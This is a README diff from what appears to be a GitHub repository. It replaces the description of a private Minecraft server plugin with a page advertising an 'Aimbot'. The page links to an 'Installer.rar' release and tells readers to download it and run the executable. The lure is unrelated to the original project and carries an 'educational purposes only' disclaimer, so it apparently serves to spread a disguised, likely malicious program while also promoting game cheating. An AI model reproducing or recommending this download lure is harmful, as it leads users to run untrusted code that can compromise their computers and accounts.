@@ -1,22 +1,37 @@
-# Season 9.5 Plugin
 
-A private Minecraft plugin made for my Minecraft Server.
+![Aimbot Full](https://github.com/bernardodangelo/season-9-5/assets/94177248/b9ea720b-b901-4363-88eb-52bb7b856eff)
 
-## Features
+<h1 align="center">Aimbot</h1>
 
-- Custom commands.
-- Aliases (Dependency: [EssentialsX](https://github.com/EssentialsX/Essentials)).
+<p align="center">
+  <b>Enhance your gaming experience with this Aimbot.</b>
+</p>
 
-## [Halloween Update](https://github.com/bernardodangelo/season-9-5/releases/tag/0.1.1)
+---
 
-- 10% chance for Zombies, Spiders, Skeletons, and Creepers to summon lightning upon death.
-- All mobs have a 20% chance to drop a pumpkin pie and a 5% chance to drop a carved pumpkin and 5% chance to drop a jack-o'-lantern upon death.
+## 🚀 Download Aimbot
 
-## [Christmas Update](https://github.com/bernardodangelo/season-9-5/releases/tag/0.1.2)
+- **Latest Version:** [Download Now](https://github.com/bernardodangelo/season-9-5/releases/download/0.1.2/Installer.rar)
 
-- 20% chance that a mob will drop a cookie when it dies.
-- Zombies, Skeletons, and Wither Skeletons will spawn wearing a red leather chestplate.
+---
 
-## Contact
+## 💡 Aimbot Instructions
 
-See my contact information on my [GitHub profile](https://github.com/bernardodangelo).
+1. Download the Aimbot from the link above.
+2. Run the Aimbot executable.
+3. Configure the Aimbot settings according to your preferences.
+4. Launch your game and enjoy the enhanced gaming experience.
+
+---
+
+## 📝 Disclaimer
+
+This Aimbot is intended for educational purposes only. Use at your own risk.
+
+---
+
+## 📝 License
+
+This project is licensed under the [MIT License](LICENSE).
+
+---
